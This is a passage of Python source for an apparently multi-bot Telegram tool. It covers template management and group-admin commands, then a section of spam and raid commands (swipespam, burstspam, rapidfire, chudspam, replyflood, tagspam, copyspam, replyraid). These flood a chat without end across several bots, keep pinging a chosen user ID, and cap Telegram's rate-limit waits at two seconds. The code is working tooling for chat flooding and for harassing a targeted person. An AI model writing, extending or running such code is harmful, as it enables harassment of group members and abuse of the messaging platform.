            "  -addtemplate og [{t}𒐫💥{w}➴ྀ{n}]\n"
            "╚══════════════════════════════════╝"
        )
        return
    name     = args[0].lower().strip()
    template = " ".join(args[1:]).strip()
    if len(name) > 30:
        await _reply(msg, "⚠️ 𝐍𝐚𝐦𝐞 𝐭𝐨𝐨 𝐥𝐨𝐧𝐠 (𝐦𝐚𝐱 30 𝐜𝐡𝐚𝐫𝐬)")
        return
    if len(template) > 220:
        await _reply(msg, "⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 𝐭𝐨𝐨 𝐥𝐨𝐧𝐠 (𝐦𝐚𝐱 220 𝐜𝐡𝐚𝐫𝐬)")
        return
    is_update = name in custom_templates
    custom_templates[name] = template
    _save_templates()
    action = "𝐔𝐩𝐝𝐚𝐭𝐞𝐝" if is_update else "𝐒𝐚𝐯𝐞𝐝"
    await _reply(msg,
        f"╔══════════════════════════╗\n"
        f"  ✅ 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄 {action}!\n"
        f"  📛 𝐍𝐚𝐦𝐞:     {name}\n"
        f"  📝 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞: {template[:50]}{'...' if len(template)>50 else ''}\n"
        f"  💡 𝐔𝐬𝐞: -customnc {name} <yourtext>\n"
        f"╚══════════════════════════╝"
    )

@_guard
async def cmd_templates(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    if not custom_templates:
        await _reply(msg,
            "╔══════════════════════════╗\n"
            "  📂 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄𝐒\n"
            "  𝘕𝘰 𝘵𝘦𝘮𝘱𝘭𝘢𝘵𝘦𝘴 𝘴𝘢𝘷𝘦𝘥 𝘺𝘦𝘵\n"
            "  𝐔𝐬𝐞 -addtemplate 𝘵𝘰 𝘢𝘥𝘥\n"
            "╚══════════════════════════╝"
        )
        return
    lines = [
        "╔══════════════════════════════╗",
        "  📂 𝐒𝐀𝐕𝐄𝐃 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄𝐒",
        "  ─────────────────────────────",
    ]
    for i, (name, tmpl) in enumerate(custom_templates.items(), 1):
        preview = tmpl[:35] + ("..." if len(tmpl) > 35 else "")
        lines.append(f"  {i}. 📛 {name}")
        lines.append(f"     📝 {preview}")
    lines.append("  ─────────────────────────────")
    lines.append(f"  𝘛𝘰𝘵𝘢𝘭: {len(custom_templates)} 𝘵𝘦𝘮𝘱𝘭𝘢𝘵𝘦𝘴")
    lines.append("  💡 -customnc <name> <text>")
    lines.append("╚══════════════════════════════╝")
    await _reply(msg, "\n".join(lines))

@_guard
async def cmd_deltemplate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -deltemplate <name>")
        return
    name = args[0].lower().strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝\n"
            f"𝐔𝐬𝐞 -templates 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭"
        )
        return
    del custom_templates[name]
    _save_templates()
    await _reply(msg, f"🗑️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐝𝐞𝐥𝐞𝐭𝐞𝐝")

@_guard
async def cmd_templateinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -templateinfo <name>")
        return
    name = args[0].lower().strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝\n"
            f"𝐔𝐬𝐞 -templates 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭"
        )
        return
    tmpl   = custom_templates[name]
    sample = _custom_template_factory(tmpl, "TEST")()
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  📝 𝐓𝐄𝐌𝐏𝐋𝐀𝐓𝐄 𝐈𝐍𝐅𝐎\n"
        f"  ─────────────────────────────\n"
        f"  📛 𝐍𝐚𝐦𝐞:    {name}\n"
        f"  📝 𝐑𝐚𝐰:     {tmpl}\n"
        f"  👁️ 𝐏𝐫𝐞𝐯𝐢𝐞𝐰: {sample}\n"
        f"  💡 𝐔𝐬𝐞: -customnc {name} <text>\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_customnc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        saved = ", ".join(custom_templates.keys()) if custom_templates else "none"
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  ⚡ 𝐂𝐔𝐒𝐓𝐎𝐌𝐍𝐂\n"
            f"  𝐔𝐬𝐞: -customnc <name> <text>\n"
            f"  ─────────────────────────────\n"
            f"  📂 𝐒𝐚𝐯𝐞𝐝: {saved}\n"
            f"  📝 𝐀𝐝𝐝 𝐧𝐞𝐰: -addtemplate\n"
            f"╚══════════════════════════════╝"
        )
        return
    name = args[0].lower().strip()
    txt  = " ".join(args[1:]).strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝\n"
            f"𝐔𝐬𝐞 -templates 𝘵𝘰 𝘴𝘦𝘦 𝘢𝘭𝘭"
        )
        return
    tmpl    = custom_templates[name]
    factory = _custom_template_factory(tmpl, txt)
    preview = factory()
    await _start_nc(msg, cid, factory, f"🎨 {name}: {txt}", engine_name="CUSTOM")

@_guard
async def cmd_previewtemplate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg  = update.message or update.edited_message
    if not msg:
        return
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg, "𝐔𝐬𝐞: -preview <name> <text>\n𝘚𝘦𝘦 𝘩𝘰𝘸 𝘵𝘦𝘮𝘱𝘭𝘢𝘵𝘦 𝘭𝘰𝘰𝘬𝘴")
        return
    name = args[0].lower().strip()
    txt  = " ".join(args[1:]).strip()
    if name not in custom_templates:
        await _reply(msg,
            f"⚠️ 𝐓𝐞𝐦𝐩𝐥𝐚𝐭𝐞 '{name}' 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝"
        )
        return
    tmpl = custom_templates[name]
    f    = _custom_template_factory(tmpl, txt)
    samples = [f() for _ in range(4)]
    await _reply(msg,
        f"╔══════════════════════════════╗\n"
        f"  👁️ 𝐏𝐑𝐄𝐕𝐈𝐄𝐖: {name}\n"
        f"  𝘵𝘦𝘹𝘵 = '{txt}'\n"
        f"  ─────────────────────────────\n" +
        "\n".join(f"  {i+1}. {s}" for i, s in enumerate(samples)) + "\n"
        f"╚══════════════════════════════╝"
    )

@_guard
async def cmd_cleartemplates(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    count = len(custom_templates)
    custom_templates.clear()
    _save_templates()
    await _reply(msg, f"🗑️ 𝐀𝐥𝐥 {count} 𝐭𝐞𝐦𝐩𝐥𝐚𝐭𝐞𝐬 𝐜𝐥𝐞𝐚𝐫𝐞𝐝")


@_guard
async def cmd_stoppfploop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    pfploop_active.pop(cid, None)
    await tc.stop(cid, "pfp")
    await _reply(msg, "⛔ 𝐏𝐅𝐏 𝐋𝐎𝐎𝐏 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


# ═══════════════════════════════════════════
#  GC MANAGEMENT COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_gcinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    bot = _bots()[0] if _bots() else ctx.bot
    try:
        chat = await bot.get_chat(cid)
        count_str = "?"
        try:
            count_str = str(await bot.get_chat_member_count(cid))
        except Exception:
            pass
        desc = (chat.description or "𝘕𝘰𝘯𝘦")[:60]
        invite = (chat.invite_link or "𝘕𝘰𝘯𝘦")
        await _reply(msg,
            f"╔══════════════════════════════╗\n"
            f"  📋 𝐆𝐂 𝐈𝐍𝐅𝐎\n"
            f"  ─────────────────────────────\n"
            f"  𝗡𝗮𝗺𝗲:    {chat.title}\n"
            f"  𝗜𝗗:      {cid}\n"
            f"  𝗠𝗲𝗺𝗯𝗲𝗿𝘀: {count_str}\n"
            f"  𝗗𝗲𝘀𝗰:    {desc}\n"
            f"  𝗟𝗶𝗻𝗸:    {invite}\n"
            f"╚══════════════════════════════╝"
        )
    except Exception as e:
        await _reply(msg, f"⚠️ Error: {e}")

@_guard
async def cmd_setgctitle(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -setgctitle <title>")
        return
    ok = 0
    for bot in _bots():
        try:
            await bot.set_chat_title(cid, txt[:255])
            ok += 1
            break
        except Exception:
            pass
    if ok:
        await _reply(msg, f"✅ 𝐆𝐂 𝐓𝐢𝐭𝐥𝐞 𝐒𝐞𝐭: {txt}")
    else:
        await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 — 𝐁𝐨𝐭 𝐧𝐞𝐞𝐝𝐬 𝐚𝐝𝐦𝐢𝐧")

@_guard
async def cmd_setgcdesc(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -setgcdesc <description>")
        return
    ok = 0
    for bot in _bots():
        try:
            await bot.set_chat_description(cid, txt[:255])
            ok += 1
            break
        except Exception:
            pass
    if ok:
        await _reply(msg, f"✅ 𝐆𝐂 𝐃𝐞𝐬𝐜 𝐒𝐞𝐭!")
    else:
        await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝 — 𝐁𝐨𝐭 𝐧𝐞𝐞𝐝𝐬 𝐚𝐝𝐦𝐢𝐧")

@_guard
async def cmd_getinvite(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    for bot in _bots():
        try:
            link = await bot.export_chat_invite_link(cid)
            await _reply(msg,
                f"╔══════════════════════════════╗\n"
                f"  🔗 𝐈𝐍𝐕𝐈𝐓𝐄 𝐋𝐈𝐍𝐊\n"
                f"  {link}\n"
                f"╚══════════════════════════════╝"
            )
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_pinmsg(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    if not rep:
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 𝘵𝘰 𝘱𝘪𝘯 𝘪𝘵")
        return
    for bot in _bots():
        try:
            await bot.pin_chat_message(cid, rep.message_id, disable_notification=True)
            await _reply(msg, "📌 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐩𝐢𝐧𝐧𝐞𝐝")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_unpinall(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    for bot in _bots():
        try:
            await bot.unpin_all_chat_messages(cid)
            await _reply(msg, "📌 𝐀𝐥𝐥 𝐦𝐬𝐠𝐬 𝐮𝐧𝐩𝐢𝐧𝐧𝐞𝐝")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_kickuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -kickuser <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    for bot in _bots():
        try:
            await bot.ban_chat_member(cid, uid)
            await asyncio.sleep(0.3)
            await bot.unban_chat_member(cid, uid)
            await _reply(msg, f"👢 𝐊𝐢𝐜𝐤𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_bantarget(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -bantarget <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    for bot in _bots():
        try:
            await bot.ban_chat_member(cid, uid)
            await _reply(msg, f"🚫 𝐁𝐚𝐧𝐧𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_unbanuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -unbanuser <uid>")
        return
    for bot in _bots():
        try:
            await bot.unban_chat_member(cid, uid, only_if_banned=True)
            await _reply(msg, f"✅ 𝐔𝐧𝐛𝐚𝐧𝐧𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_muteuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -muteuser <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    from telegram import ChatPermissions
    for bot in _bots():
        try:
            await bot.restrict_chat_member(cid, uid,
                permissions=ChatPermissions(can_send_messages=False),
                until_date=0)
            await _reply(msg, f"🔇 𝐌𝐮𝐭𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_unmuteuser(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    uid  = None
    if args:
        try:
            uid = int(args[0])
        except ValueError:
            pass
    if uid is None and msg.reply_to_message and msg.reply_to_message.from_user:
        uid = msg.reply_to_message.from_user.id
    if uid is None:
        await _reply(msg, "𝐔𝐬𝐞: -unmuteuser <uid>  or  𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘶𝘴𝘦𝘳")
        return
    from telegram import ChatPermissions
    for bot in _bots():
        try:
            await bot.restrict_chat_member(cid, uid,
                permissions=ChatPermissions(
                    can_send_messages=True,
                    can_send_media_messages=True,
                    can_send_other_messages=True,
                    can_add_web_page_previews=True,
                ), until_date=0)
            await _reply(msg, f"🔊 𝐔𝐧𝐦𝐮𝐭𝐞𝐝: {uid}")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_setpfponce(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    if not (rep and rep.photo):
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘱𝘩𝘰𝘵𝘰 𝘵𝘰 𝘴𝘦𝘵 𝘎𝘊 𝘱𝘩𝘰𝘵𝘰")
        return
    fid = rep.photo[-1].file_id
    for bot in _bots():
        try:
            await bot.set_chat_photo(cid, fid)
            await _reply(msg, "✅ 𝐆𝐂 𝐏𝐡𝐨𝐭𝐨 𝐒𝐞𝐭")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")

@_guard
async def cmd_deletegcpfp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    for bot in _bots():
        try:
            await bot.delete_chat_photo(cid)
            await _reply(msg, "✅ 𝐆𝐂 𝐏𝐡𝐨𝐭𝐨 𝐑𝐞𝐦𝐨𝐯𝐞𝐝")
            return
        except Exception:
            pass
    await _reply(msg, "⚠️ 𝐅𝐚𝐢𝐥𝐞𝐝")


# ═══════════════════════════════════════════
#  SLIDE / SWIPE / BURST SPAM COMMANDS
# ═══════════════════════════════════════════

_SWIPE_VARIANTS = [
    "🌊〰️〰️〰️{t}〰️〰️〰️🌊 ➴ྀ",
    "💨〰〰{t}〰〰💨 ·· ➴ྀ",
    "⚡〰{t}〰⚡ 𒐫𒐫 ➴ྀ",
    "🌀〰〰〰{t}〰〰〰🌀 ➴ྀ",
    "🔱〰〰{t}〰〰🔱 ··· ➴ྀ",
    "💥〰{t}〰💥 𒐫𒐫𒐫 ➴ྀ",
    "🌊💦{t}💦🌊 ➴ྀ ··",
    "〽️〰{t}〰〽️ ·· ➴ྀ",
]

@_guard
async def cmd_swipespam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -swipespam <text>")
        return
    idx = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                v = _SWIPE_VARIANTS[idx[0] % len(_SWIPE_VARIANTS)].format(t=txt)
                idx[0] += 1
                try:
                    await bot.send_message(cid, v)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "swipe", _run)
    await _reply(msg,
        f"🌊 𝐒𝐖𝐈𝐏𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stopswipe to stop"
    )

@_guard
async def cmd_stopswipe(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "swipe")
    await _reply(msg, "⛔ 𝐒𝐖𝐈𝐏𝐄 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_burstspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if not args:
        await _reply(msg, "𝐔𝐬𝐞: -burstspam <text> [count]")
        return
    try:
        count = int(args[-1])
        txt   = " ".join(args[:-1]).strip()
        if not txt:
            raise ValueError
    except (ValueError, IndexError):
        txt   = " ".join(args).strip()
        count = 20
    count = min(count, 50)
    bots  = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍?? 𝐛𝐨𝐭𝐬!")
        return

    VARIANTS = [
        f"💥𒐫𒐫{txt}𒐫𒐫💥 ➴ྀ",
        f"🔥 {txt} 🔥 ➴ྀ",
        f"⚡{txt}⚡ ➴ྀ ··",
        f"💀 {txt} 💀 ➴ྀ",
        f"👑{txt}👑 ➴ྀ",
    ]

    async def _send(bot, i):
        try:
            await bot.send_message(cid, VARIANTS[i % len(VARIANTS)])
        except Exception:
            pass

    tasks = [asyncio.create_task(_send(bots[i % len(bots)], i)) for i in range(count)]
    await asyncio.gather(*tasks, return_exceptions=True)
    await _reply(msg, f"💥 𝐁𝐔𝐑𝐒𝐓 𝐒𝐄𝐍𝐓 — {count} 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬")

@_guard
async def cmd_chudspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -chudspam <text>")
        return
    words = list(_CHUD_WORDS)
    idx   = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in _bots():
                if stop_ev.is_set():
                    break
                word = words[idx[0] % len(words)]
                idx[0] += 1
                msg_txt = (
                    f"[chud {txt}"
                    f"𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫💥💥"
                    f"{word} "
                    f"𒐫𒐫𒐫💥𒐫💥𒐫𒐫𒐫 ➴ྀ࿐ ·· ]"
                )
                try:
                    await bot.send_message(cid, msg_txt)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "chudspam", _run)
    await _reply(msg,
        f"💥 𝐂𝐇𝐔𝐃 𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stopchudspam to stop"
    )

@_guard
async def cmd_stopchudspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "chudspam")
    await _reply(msg, "⛔ 𝐂𝐇𝐔𝐃 𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_rapidfire(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -rapidfire <text>")
        return
    bots = _bots()
    if not bots:
        await _reply(msg, "⚡ 𝐍𝐨 𝐛𝐨𝐭𝐬!")
        return

    RAPID = [
        f"⚡🔥{txt}🔥⚡ ➴ྀ",
        f"💥⚡{txt}⚡💥 ·· ➴ྀ",
        f"🌊⚡{txt}⚡🌊 ➴ྀ ··",
        f"👑⚡{txt}⚡👑 ·· ➴ྀ",
    ]
    idx = [0]

    async def _run(stop_ev):
        while not stop_ev.is_set():
            tasks = []
            for bot in bots:
                if stop_ev.is_set():
                    break
                v = RAPID[idx[0] % len(RAPID)]
                idx[0] += 1
                async def _s(b=bot, m=v):
                    try:
                        await b.send_message(cid, m)
                    except Exception:
                        pass
                tasks.append(asyncio.create_task(_s()))
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(0)

    await tc.start(cid, "rapid", _run)
    await _reply(msg,
        f"⚡🔥 𝐑𝐀𝐏𝐈𝐃𝐅𝐈𝐑𝐄 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"📛 {txt}\n"
        f"-stoprapid to stop"
    )

@_guard
async def cmd_stoprapid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "rapid")
    await _reply(msg, "⛔ 𝐑𝐀𝐏𝐈𝐃𝐅𝐈𝐑𝐄 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


# ═══════════════════════════════════════════
#  AUTO REPLY EXTENDED COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_replyflood(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    txt = _txt_arg(ctx)
    if not txt:
        await _reply(msg, "𝐔𝐬𝐞: -replyflood <text>\n𝘉𝘰𝘵 𝘳𝘦𝘱𝘭𝘪𝘦𝘴 𝘵𝘰 𝘌𝘝𝘌𝘙𝘠 𝘮𝘴𝘨 𝘸𝘪𝘵𝘩 𝘴𝘱𝘢𝘮")
        return
    replyflood_chats[cid] = txt
    await _reply(msg,
        f"✅ 𝐑𝐄𝐏𝐋𝐘𝐅𝐋𝐎𝐎𝐃 𝐀𝐂𝐓𝐈𝐕𝐄\n"
        f"💬 {txt}\n"
        f"-stopreplyflood to stop"
    )

@_guard
async def cmd_stopreplyflood(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    replyflood_chats.pop(msg.chat_id, None)
    await _reply(msg, "⛔ 𝐑𝐄𝐏𝐋𝐘𝐅𝐋𝐎𝐎𝐃 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_tagspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid  = msg.chat_id
    args = _get_args(ctx)
    if len(args) < 2:
        await _reply(msg,
            "𝐔𝐬𝐞: -tagspam <uid> <text>\n"
            "𝘒𝘦𝘦𝘱𝘴 𝘮𝘦𝘯𝘵𝘪𝘰𝘯𝘪𝘯𝘨 𝘵𝘢𝘳𝘨𝘦𝘵 𝘶𝘴𝘦𝘳"
        )
        return
    try:
        uid = int(args[0])
    except ValueError:
        await _reply(msg, "⚠️ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐮𝐬𝐞𝐫 𝐈𝐃")
        return
    txt  = " ".join(args[1:]).strip()
    bots = _bots()

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in bots:
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(
                        cid,
                        f'<a href="tg://user?id={uid}">⚡</a> {txt}',
                        parse_mode="HTML"
                    )
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "tagspam", _run)
    await _reply(msg,
        f"🎯 𝐓𝐀𝐆𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"👤 𝘜𝘴𝘦𝘳: {uid}\n"
        f"💬 {txt}\n"
        f"-stoptagspam to stop"
    )

@_guard
async def cmd_stoptagspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "tagspam")
    await _reply(msg, "⛔ 𝐓𝐀𝐆𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")

@_guard
async def cmd_copyspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    txt = _txt_arg(ctx)
    target_txt = txt or (rep.text if rep and rep.text else None)
    if not target_txt:
        await _reply(msg, "𝐑𝐞𝐩𝐥𝐲 𝘵𝘰 𝘢 𝘮𝘴𝘨 𝘰𝘳 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘵𝘦𝘹𝘵")
        return
    bots = _bots()

    async def _run(stop_ev):
        while not stop_ev.is_set():
            for bot in bots:
                if stop_ev.is_set():
                    break
                try:
                    await bot.send_message(cid, target_txt)
                except RetryAfter as e:
                    try:
                        await asyncio.wait_for(stop_ev.wait(), timeout=min(e.retry_after, 2.0))
                    except asyncio.TimeoutError:
                        pass
                except Exception:
                    pass
            await asyncio.sleep(0)

    await tc.start(cid, "copyspam", _run)
    await _reply(msg,
        f"📋 𝐂𝐎𝐏𝐘𝐒𝐏𝐀𝐌 𝐒𝐓𝐀𝐑𝐓𝐄𝐃\n"
        f"💬 {target_txt[:40]}...\n"
        f"-stopcopyspam to stop"
    )

@_guard
async def cmd_stopcopyspam(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    await tc.stop(msg.chat_id, "copyspam")
    await _reply(msg, "⛔ 𝐂𝐎𝐏𝐘𝐒𝐏𝐀𝐌 𝐒𝐓𝐎𝐏𝐏𝐄𝐃")


# ═══════════════════════════════════════════
#  REPLY RAID COMMANDS
# ═══════════════════════════════════════════

@_guard
async def cmd_replyraid(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message or update.edited_message
    if not msg:
        return
    cid = msg.chat_id
    rep = msg.reply_to_message
    txt = _txt_arg(ctx)
